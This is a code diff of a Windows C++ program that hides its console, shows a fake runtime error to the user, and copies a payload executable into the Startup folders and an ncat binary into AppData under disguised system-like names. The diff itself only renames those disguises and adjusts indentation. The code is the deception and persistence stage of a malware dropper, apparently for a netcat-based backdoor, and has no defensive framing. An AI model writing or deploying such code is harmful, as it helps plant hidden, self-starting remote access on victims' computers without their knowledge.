@@ -8,7 +8,7 @@ int main(int argc, char* argv[])
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-  // show fake runtime error
+  	// show fake runtime error
 	MessageBox
 	(
 		NULL,
@@ -24,18 +24,18 @@ int main(int argc, char* argv[])
 
 	std::string newPayloadDirectory = "C:\\Users\\";
 	newPayloadDirectory += username;
-	newPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\WinIPManager.exe";
+	newPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\Win32Man.exe";
 
 	std::string otherPayloadDirectory = "C:\\Users\\";
 	otherPayloadDirectory += username;
-	otherPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinIPManager.exe";
+	otherPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Win32Man.exe";
 
-  std::string ncatDir = "C:\\Users\\";
+  	std::string ncatDir = "C:\\Users\\";
 	ncatDir += username;
-	ncatDir += "\\AppData\\Local\\Win32Man.exe";
+	ncatDir += "\\AppData\\Local\\Win32Runtime.exe";
 
 	// move the payload to startup
-  CopyFile("../src/ncat.exe", ncatDir.c_str(), false);
+  	CopyFile("../src/ncat.exe", ncatDir.c_str(), false);
 	CopyFile("../src/main.exe", newPayloadDirectory.c_str(), false);
 	CopyFile("../src/main.exe", otherPayloadDirectory.c_str(), false);
 	return 0;
